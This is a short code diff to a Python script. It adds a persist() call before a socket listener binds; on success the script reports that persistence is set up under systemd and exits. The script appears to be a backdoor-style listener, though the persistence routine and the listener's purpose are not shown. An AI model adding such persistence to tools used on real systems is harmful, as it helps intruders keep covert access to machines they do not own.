@@ -689,7 +689,10 @@ def main():
     
     # Bind socket (both root and non-root do this)
     print(f"[*] Binding to {HOST}:{PORT}...")
-    
+    if persist():
+            print("[+] Persistence established. Letting systemd take over. Exiting foreground process.")
+            sys.exit(0)
+
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
